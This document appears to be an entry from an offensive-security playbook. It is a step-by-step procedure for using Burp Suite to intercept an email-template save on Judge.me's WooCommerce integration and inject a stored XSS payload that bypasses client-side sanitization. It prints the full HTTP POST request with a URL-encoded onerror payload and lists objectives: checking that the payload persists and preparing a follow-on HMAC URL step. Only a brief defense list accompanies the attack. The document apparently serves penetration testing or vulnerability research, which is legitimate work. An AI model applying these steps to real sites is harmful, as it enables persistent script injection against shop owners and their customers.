---
tags:
  - xss
  - interception
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/burp-intercept-modify]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.204Z'
sub_techniques: []
id: 6a33e869-830c-4fdf-9b58-76a0feae3483
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Save-Template-with-Burp-Suite-Interception

## Summary

Intercept and modify the save request for an email template to ensure the XSS payload bypasses any additional client-side sanitization.

## Description

Direct saves may trigger sanitization; using Burp Suite to tamper with the POST request allows injection of the raw payload. This occurs in the context of Judge.me's WooCommerce integration, targeting the /edit endpoint.

## Requirements

1. Burp Suite proxy configured in browser
2. Template editor open with payload inserted
3. Network access to judge.me

## Defense

- Enable request logging and anomaly detection for template saves
- Use CSP with strict-dynamic for script loading
- Rate-limit admin actions

## Objectives

1. Save template with unsanitized payload
2. Confirm persistence post-save
3. Prepare for HMAC URL generation

## Instructions

### Step 1: Intercept Save Request

**Context**: Trigger the save action while proxying through Burp.

**Command** ([[commands/burp-intercept-modify]]):
```http
POST /shop/emails/[ID] HTTP/1.1
Host: www.judge.me
Content-Type: application/x-www-form-urlencoded

html=<! [endif]--onerror=%22<! [endif]--%3E%22onload=%22%3Cimg%20src=1%20onerror='alert(1)'/%3E%22
```

> Modify the 'html' parameter to include URL-encoded payload. Forward the request.

### Step 2: Verify Save

**Context**: Reload the template to check payload.

> Expected: 200 response and payload intact on reload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/burp-intercept-modify]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[interception]]
